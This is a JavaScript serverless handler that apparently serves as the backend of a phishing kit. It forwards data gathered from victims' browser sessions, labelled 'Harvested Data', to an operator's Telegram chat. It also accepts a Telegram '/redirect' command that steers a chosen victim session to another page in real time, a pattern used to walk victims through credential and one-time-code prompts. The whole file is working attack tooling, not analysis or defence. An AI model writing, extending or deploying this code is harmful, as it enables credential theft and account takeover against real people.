import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const update = req.body;

    // Handle incoming Telegram Bot Commands (/redirect <session_id> <page_id>)
    if (update.message && update.message.text) {
      const text = update.message.text;
      if (text.startsWith('/redirect')) {
        const parts = text.split(' ');
        if (parts.length >= 3) {
          const targetSession = parts[1];
          const targetPage = parts[2];
          await supabase.from('sessions').update({ current_page: targetPage }).eq('session_id', targetSession);
          await sendTelegramMessage(`✅ Session <code>${targetSession}</code> steered to <code>${targetPage}</code>.`);
        }
      }
      return res.status(200).json({ status: 'command_processed' });
    }

    // Handle Frontend Sync Reports -> Forward to Telegram Chat
    const { session_id, page, data } = update;
    if (session_id) {
      let dataString = Object.entries(data || {}).map(([k, v]) => `<b>${k}:</b> ${v}`).join('\n');
      const msg = `🚨 <b>N3URAL 3NGIN3 UPDATE</b>\n\n📌 <b>Session:</b> <code>${session_id}</code>\n📄 <b>Node:</b> <code>${page}</code>\n\n<b>Harvested Data:</b>\n${dataString}\n\n⚙️ <i>Cmd: /redirect ${session_id} [page]</i>`;
      await sendTelegramMessage(msg);
      return res.status(200).json({ status: 'notified' });
    }
  }
  return res.status(405).json({ error: 'Method not allowed' });
}

async function sendTelegramMessage(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
  });
}